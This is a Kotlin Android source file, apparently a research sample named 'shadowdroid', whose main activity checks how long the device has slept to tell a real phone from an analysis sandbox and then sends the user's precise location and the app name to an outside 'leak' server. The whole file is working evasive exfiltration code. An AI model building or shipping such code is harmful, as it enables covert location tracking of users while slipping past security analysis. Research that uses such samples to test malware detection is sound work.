package nl.tbethe.shadowdroid.sleeptime

import android.Manifest
import android.annotation.SuppressLint
import android.content.pm.PackageManager
import android.location.Criteria
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.os.SystemClock
import android.util.Log
import androidx.activity.result.contract.ActivityResultContracts
import androidx.annotation.RequiresPermission
import io.ktor.client.*
import io.ktor.client.engine.cio.*
import io.ktor.client.request.forms.*
import io.ktor.client.statement.*
import io.ktor.http.*
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

private const val TAG = "MainActivity"

class MainActivity : AppCompatActivity() {

    @SuppressLint("MissingPermission")
    val requestPermission =
        registerForActivityResult(ActivityResultContracts.RequestPermission()) { isGranted ->
            if (isGranted) sendLocation()
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val uptimeWithSleep = SystemClock.elapsedRealtime()
        val uptimeWithoutSleep = SystemClock.uptimeMillis()
        val sleepTimeMillis = uptimeWithSleep - uptimeWithoutSleep

        // 2 hours = 1_000 * 60 * 60 * 2 = 7_200_000 milliseconds
        val twoHourMillis : Long = 7_200_000

        leakLocationIf (sleepTimeMillis > twoHourMillis)
    }

    private fun leakLocationIf(notAnalyser: Boolean) {
        if (!notAnalyser) return

        when (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
            PackageManager.PERMISSION_DENIED -> {
                requestPermission.launch(Manifest.permission.ACCESS_FINE_LOCATION)
            }
            PackageManager.PERMISSION_GRANTED -> {
                sendLocation()
            }
        }
    }

    @RequiresPermission("android.permission.ACCESS_FINE_LOCATION")
    @SuppressLint("MissingPermission")
    private fun sendLocation() {
        val locationManager = getSystemService(LocationManager::class.java)
        val provider : String? = locationManager.getBestProvider(Criteria(), true)
        provider?.let {
            locationManager.requestSingleUpdate(provider, object : LocationListener {
                override fun onProviderEnabled(provider: String) {}

                override fun onProviderDisabled(provider: String) {}

                override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}

                override fun onLocationChanged(location: Location) {
                    val url = "https://vm-thijs.ewi.utwente.nl/shadow-droid/leak"
                    CoroutineScope(Dispatchers.IO).launch {
                        try {
                            HttpClient(CIO).use { client ->
                                val response = client.submitForm<HttpResponse>(
                                    url,
                                    Parameters.build {
                                        append("appname", packageName)
                                        append("latitude", "${location.latitude}")
                                        append("longitude", "${location.longitude}")
                                    },
                                    false
                                )
                                Log.d(TAG, "Response status: ${response.status}")
                                Log.d(TAG, "Response: ${response.readText()}")
                            }
                        } catch (e: Exception) {
                            Log.d(TAG, "IO Exception occurred when trying to exfiltrate data")
                            e.printStackTrace()
                        }
                    }
                }

            }, null)
        } ?: Log.d(TAG, "No provider; cannot send location")
    }
}
